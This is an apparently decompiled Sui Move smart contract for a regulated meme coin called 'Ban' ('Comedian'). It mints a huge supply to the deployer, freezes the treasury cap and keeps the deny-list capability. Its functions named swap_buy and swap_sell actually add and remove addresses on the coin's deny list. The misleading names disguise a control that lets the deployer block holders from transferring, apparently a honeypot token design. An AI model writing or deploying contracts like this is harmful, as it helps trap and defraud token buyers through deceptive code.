module 0x584d9e220694cec0b9747e5dea65f8ae85fb6e24e616c06d27aeef68a6854cc8::ban {
    struct BAN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BAN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BAN>(arg0, 9, b"Ban", b"Comedian", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmfKEGFPjMhtMdc6Nud7yvbPS8tiXfbFu2jGMvSUTejF9V"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BAN>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BAN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BAN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BAN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BAN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BAN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BAN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BAN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

